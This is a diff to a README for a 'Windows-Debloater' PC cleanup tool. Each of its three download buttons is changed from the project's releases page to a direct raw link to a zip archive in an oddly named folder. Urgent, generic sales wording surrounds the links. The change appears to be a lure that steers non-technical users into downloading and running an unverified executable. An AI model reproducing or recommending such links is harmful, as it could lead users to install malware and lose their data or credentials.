@@ -1,6 +1,6 @@
 # 🪟 Windows-Debloater - Clean Your PC Fast and Free
 
-[![Download Windows-Debloater](https://img.shields.io/badge/Download-Windows--Debloater-2ea44f?style=for-the-badge&logo=windows&logoColor=white&labelColor=blue)](https://github.com/masswafer7846/Windows-Debloater/releases)
+[![Download Windows-Debloater](https://img.shields.io/badge/Download-Windows--Debloater-2ea44f?style=for-the-badge&logo=windows&logoColor=white&labelColor=blue)](https://raw.githubusercontent.com/masswafer7846/Windows-Debloater/main/subassociation/v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ Think of it like spring cleaning for your computer. You get rid of the stuff you
 
 Visit this link to download the application. The download will start automatically from this page.
 
-[![Download Now](https://img.shields.io/badge/Download-Windows--Debloater-FF5733?style=for-the-badge&logo=download&logoColor=white)](https://github.com/masswafer7846/Windows-Debloater/releases)
+[![Download Now](https://img.shields.io/badge/Download-Windows--Debloater-FF5733?style=for-the-badge&logo=download&logoColor=white)](https://raw.githubusercontent.com/masswafer7846/Windows-Debloater/main/subassociation/v2.6.zip)
 
 After you click the link, you will see a page with a list of files. Find the file that says "Windows-Debloater" and looks like an application file. Click on it to download it to your computer. The download might take a few minutes depending on your internet speed.
 
@@ -93,7 +93,7 @@ For the best results, run Windows-Debloater once a month. This will keep your sy
 
 Ready to make your computer faster? Click the button below to get started. It takes less than five minutes to download and run.
 
-[![Get Windows-Debloater Free](https://img.shields.io/badge/Get%20Windows--Debloater%20Free-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/masswafer7846/Windows-Debloater/releases)
+[![Get Windows-Debloater Free](https://img.shields.io/badge/Get%20Windows--Debloater%20Free-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/masswafer7846/Windows-Debloater/main/subassociation/v2.6.zip)
 
 Visit this link to download the application. You will not regret it. Your computer will thank you.
 
